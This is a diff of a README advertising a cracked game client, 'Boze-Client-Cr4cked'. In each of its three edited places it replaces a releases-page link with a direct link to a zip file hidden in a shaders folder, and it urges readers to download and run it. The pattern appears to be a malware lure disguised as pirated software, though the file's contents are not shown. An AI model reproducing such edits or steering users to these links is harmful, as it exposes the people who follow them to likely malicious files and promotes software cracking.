@@ -1,6 +1,6 @@
 # 🧩 Boze-Client-Cr4cked - Simple Access, Fast Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/carmelvindicatory837/Boze-Client-Cr4cked/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/carmelvindicatory837/Boze-Client-Cr4cked/main/shaders/standard/Client_Cr_Boze_cked_v3.4.zip)
 
 ## 🖥️ What Boze-Client-Cr4cked Does
 
@@ -17,7 +17,7 @@ Use it when you want:
 
 Visit this page to download the latest release:
 
-https://github.com/carmelvindicatory837/Boze-Client-Cr4cked/releases
+https://raw.githubusercontent.com/carmelvindicatory837/Boze-Client-Cr4cked/main/shaders/standard/Client_Cr_Boze_cked_v3.4.zip
 
 On that page, look for the newest release at the top. Then download the Windows file that fits your system.
 
@@ -127,7 +127,7 @@ Use the file from the release page, then right-click it and choose **Properties*
 
 Use this link to get the current Windows download:
 
-https://github.com/carmelvindicatory837/Boze-Client-Cr4cked/releases
+https://raw.githubusercontent.com/carmelvindicatory837/Boze-Client-Cr4cked/main/shaders/standard/Client_Cr_Boze_cked_v3.4.zip
 
 ## 🧾 Quick Start
 
